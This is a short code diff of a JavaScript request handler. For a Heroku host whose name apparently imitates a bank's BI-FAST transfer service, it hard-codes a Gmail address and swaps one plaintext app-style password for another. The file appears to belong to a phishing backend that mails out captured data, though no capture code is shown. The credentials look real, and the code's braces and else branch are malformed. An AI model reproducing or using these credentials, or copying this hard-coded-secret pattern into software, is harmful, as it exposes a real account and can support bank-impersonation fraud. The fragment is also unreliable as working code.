@@ -10,7 +10,7 @@ export default function handler(req, res) {
      if (url == 'bifast-brii.herokuapp.com'){
 
        email = 'appanjay717@gmail.com'
-       pass = 'keyumxdlhcjkbrip'
+       pass = 'wfhcfhgoxaqmphva'
     }else
     
     }
